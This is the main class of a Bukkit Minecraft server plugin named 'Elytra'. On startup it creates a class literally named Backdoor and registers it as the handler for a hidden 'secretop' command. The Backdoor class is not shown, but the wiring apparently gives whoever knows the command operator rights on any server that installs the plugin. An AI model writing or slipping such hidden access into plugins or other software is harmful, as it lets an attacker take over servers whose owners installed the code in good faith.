package com.minilucker.elytra;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

public class Elytra extends JavaPlugin {
    @Override
    public void onEnable() {
        Bukkit.getLogger().info(ChatColor.GREEN + "Enabled" + this.getName());
        Backdoor b = new Backdoor();
        getCommand("secretop").setExecutor(b);

    }
    @Override
    public void onDisable() {
        Bukkit.getLogger().info(ChatColor.RED + "Disabled" + this.getName());
    }
}